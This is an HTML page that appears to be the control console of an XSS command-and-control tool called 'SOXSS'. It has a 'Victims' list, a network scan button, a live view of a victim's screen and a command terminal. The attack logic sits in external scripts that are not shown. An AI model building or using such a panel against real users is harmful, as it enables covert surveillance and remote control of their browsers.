<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SOXSS | Control Console</title>
    <link rel="stylesheet" href="console.css">
    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
    <script src="console.js"></script>
    <script src="clientList.js"></script>
    <script src="loadScripts.js"></script>
</head>

<body>
    <div class="container">
        <!-- Sidebar -->
        <aside id="sidebar">
            <div class="sidebar-header">
                <h2>Victims</h2>
                <div class="reload-bar">
                    <button class="btn-primary" onclick="loadClientList()" style="width: 100%;">SCAN NETWORK</button>
                    <div id="autoReloadSub"><button id="autoReloadToggle" class="btn-secondary" onclick="toggleAutoReload()">AUTO-RELOAD:
                            ON</button>
                        <input type="number" id="reloadInterval" value="5" min="1" max="60" disabled="">
                    </div>
                </div>
            </div>
            <div id="clientList">
                <!-- Clients populated by JS -->
            </div>
        </aside>

        <!-- Main Content -->
        <main class="main-content">
            <!-- Preview Section -->
            <section id="screenshotPreview" onclick="togglePreview()">
                <div class="preview-header">
                    <h2 id="previewStatus">Live View: No Client Selected</h2>
                    <span id="previewInfo" style="font-size: 0.8rem; color: var(--text-muted);">Click to Toggle</span>
                </div>
                <img id="previewImage" src="" alt="Victim Screen" />
            </section>

            <!-- Terminal -->
            <section class="terminal">
                <div id="log"></div>

                <div class="input-container">
                    <form id="inputCommand" onsubmit="handleConsoleSubmit(); return false;">
                        <span id="terminalPrompt" class="prompt">victim@soxss:~$</span>
                        <input id="inputText" type="text" placeholder="type a command..." autocomplete="off">
                    </form>
                </div>
            </section>
        </main>
    </div>
</body>

</html>
